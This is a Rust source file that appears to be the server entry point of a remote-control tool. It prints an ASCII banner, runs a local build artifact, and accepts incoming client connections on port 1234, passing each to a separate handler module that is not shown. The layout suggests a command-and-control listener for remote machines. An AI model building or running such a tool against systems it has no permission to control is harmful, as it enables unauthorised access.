use colored::Colorize;
use std::net::TcpListener;
use std::thread;
mod client;
mod command;
mod utils;
use std::process::Command;
use std::string::ToString;

fn main() {
    let ascii = r#"
           .%@@@@@@@@@@@@@@@@@@@@@@@%:.                       .=@@@@@@@@@@@@@@@@@@@@@@@@+.
            :#@@@@@@@@@@@@@@@@@@@@@@@%-.                    ..*@@@@@@@@@@@@@@@@@@@@@@@%=.
                           .+@@@@@@@@@%:.                   .*@@@@@@@@@@=.
               ............  =@@@@@@@@@@-.                 .*@@@@@@@@@%-. ...........
               .#@@@@@@@@@%:..=@@@@@@@@@@=.              ..*@@@@@@@@@@- .-@@@@@@@@@@=.
                .#@@@@@@@@@%. .-@@@@@@@@@@-              .*@@@@@@@@@@:. -%@@@@@@@@@=.
                 .*@@@@@@@@@@:. -@@@@@@@@@@+.           .#@@@@@@@@@%. .-@@@@@@@@@@-
                  .*@@@@@@@@@%- .-@@@@@@@@@@+.        .:%@@@@@@@@@%:..=@@@@@@@@@@-.
                    =@@@@@@@@@@-. :@@@@@@@@@@+.       .%@@@@@@@@@%. .=@@@@@@@@@@:.
                    .+@@@@@@@@@@=..-@@@@@@@@@@*.    .:@@@@@@@@@@#...+@@@@@@@@@%:
                     .=@@@@@@@@@@=. :@@@@@@@@@@*.   -%@@@@@@@@@#. .+@@@@@@@@@@-.
                      .=@@@@@@@@@@+. :%@@@@@@@@@#. :@@@@@@@@@@*. .*@@@@@@@@@%:.
                       .=@@@@@@@@@@+..:%@@@@@@@@@%*@@@@@@@@@@*...#@@@@@@@@@#:
                        .-@@@@@@@@@@+...%@@@@@@@@@@@@@@@@@@@*. .#@@@@@@@@@%..
                          :@@@@@@@@@@#...#@@@@@@@@@@@@@@@@@+  .#@@@@@@@@@#.
                          .:@@@@@@@@@@#...#@@@@@@@@@@@@@@@+. :%@@@@@@@@@#:
                           ..%@@@@@@@@@#...*@@@@@@@@@@@@@=. :#@@@@@@@@@#.
                             :#@@@@@@@@@%:..*@@@@@@@@@@@-..:%@@@@@@@@@+.
                              .#@@@@@@@@@%:..*@@@@@@@@@-..-%@@@@@@@@@*.
                               .*@@@@@@@@@@:..+@@@@@@@:..:%@@@@@@@@@*.
                                .*@@@@@@@@@@-..+@@@@%:..-@@@@@@@@@@+.
                                ..*@@@@@@@@@@-..=@@%:..-@@@@@@@@@@=.
                                  .+@@@@@@@@@@=..-+. .=@@@@@@@@@@=.
                                  ..+@@@@@@@@@@=.   .+@@@@@@@@@@-.
                                    .=@@@@@@@@@@+. .+@@@@@@@@@@-.
                                     .=@@@@@@@@@@*:+@@@@@@@@@%:.
                                      .-@@@@@@@@@@@@@@@@@@@@@-.
                                       .:%@@@@@@@@@@@@@@@@@%:.
                                        .-@@@@@@@@@@@@@@@@%:
                                         .:@@@@@@@@@@@@@@%:.
                                           :%@@@@@@@@@@@#.
                                           ..%@@@@@@@@@#.
                                             .#@@@@@@@#.
                                              .*@@@@@+.
                                               .*@@@*.
                                                .+@*.
"#;
    println!("{}", ascii.purple());
    
    
   
    let listener = TcpListener::bind("0.0.0.0:1234".to_string())
        .expect("Couldn't bind this address...");
    let output = Command::new("./artifact/release")
        .output()
        .expect("Failed to execute command");

    // Directly print the result
    println!("{}", String::from_utf8_lossy(&output.stdout));
    println!("\n[*] Waiting for clients to connect...");
    
    for stream in listener.incoming() {
        if let Ok(stream) = stream {
            thread::spawn(move || {
                client::Client::handle_client(stream);
            });
        } else {
            println!("[*] A client tried to connect...");
        }
    }
}
